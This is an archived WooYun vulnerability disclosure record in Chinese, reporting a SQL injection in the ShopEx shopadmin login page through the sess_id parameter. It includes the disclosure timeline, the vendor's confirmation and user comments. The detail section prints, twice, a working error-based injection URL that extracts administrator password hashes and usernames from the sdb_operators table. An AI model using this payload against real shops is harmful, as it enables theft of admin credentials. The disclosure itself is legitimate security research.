{"id": 9078, "wybug_id": "wooyun-2013-035254", "wybug_title": "shopex某分站SQL注入漏洞一枚", "wybug_corp": "ShopEx", "wybug_author": "Black Angel", "wybug_date": "2013-08-25 15:23", "wybug_open_date": "2013-10-09 15:24", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-08-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-08-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-09-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-09-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-09-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-10-09：\t细节向公众公开  简要描述： shopex某分站SQL注入。求礼物。不拖库。 详细说明：  既然漏洞已经被公布,那我也就来跟跟风吧.为下周五的QB做点准备~缺陷url:http://hodbuy20.shopex.cn/shopadmin/index.php?ctl=passport&act=login&sess_id=1下图只为证明，不为拖库，不进一步。\n\n在\\shopex\\core\\admin\\controller\\ctl.passport.php中function certi_validate(){        $cert = $this->system->loadModel('service/certificate');        $sess_id = $_POST['session_id'];         $return = array();        if($sess_id == $cert->get_sess()){            $return = array(                'res' => 'succ',                'msg' => '',                'info' => ''            );             echo json_encode($return);        }else{            $return = array(                'res' => 'fail',                'msg' => '000001',                'info' => 'You have the different session!'            );             echo json_encode($return);        }    } 在参数sess_id传递的时候没有做任何的处理，直接带入查询了。导致注入的产生。exp:http://www.xxxx.com/shopadmin/index.php?ctl=passport&act=login&sess_id=1'+and(select+1+from(select+count(*),concat((select+(select+(select+concat(userpass,0x7e,username,0x7e,op_id)+from+sdb_operators+Order+by+username+limit+0,1)+)+from+`information_schema`.tables+limit+0,1),floor(rand(0)*2))x+from+`information_schema`.tables+group+by+x)a)+and+'1'='1 对于不能爆出来的可以使用工具跑注入点http://www.xxx.com/shopadmin/index.php?ctl=passport&act=login&sess_id=1    漏洞证明：  既然漏洞已经被公布,那我也就来跟跟风吧.为下周五的QB做点准备~缺陷url:http://hodbuy20.shopex.cn/shopadmin/index.php?ctl=passport&act=login&sess_id=1下图只为证明，不为拖库，不进一步。\n\nexp:在参数sess_id传递的时候没有做任何的处理，直接带入查询了。导致注入的产生。http://www.xxxx.com/shopadmin/index.php?ctl=passport&act=login&sess_id=1'+and(select+1+from(select+count(*),concat((select+(select+(select+concat(userpass,0x7e,username,0x7e,op_id)+from+sdb_operators+Order+by+username+limit+0,1)+)+from+`information_schema`.tables+limit+0,1),floor(rand(0)*2))x+from+`information_schema`.tables+group+by+x)a)+and+'1'='1 对于不能爆出来的可以使用工具跑注入点http://www.xxx.com/shopadmin/index.php?ctl=passport&act=login&sess_id=1 注：影响的不止一个版本。   修复方案：  过滤，发布补丁。   版权声明：转载请注明来源 Black Angel@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2013-08-26 13:23 厂商回复： 非常感谢您为shopex信息安全做的贡献我们将尽快修复非常感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-08-25 19:24 |    \t\tSkull \t\t\t( 实习白帽子  |\t\t\t        Rank:95 漏洞数:33        | 菜鸟一枚。)\t\t \n  哎    \n     2013-09-13 20:04 |    \t\tknickers \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:6        | 偶是一个大帅哥)\t\t \n  围观，，，，，，关注中    \n     2013-10-23 21:24 |    \t\t子默不语 \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:4        | 习惯夜的黑 享受寂寞)\t\t \n  官网目测还有。day  我匿了    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}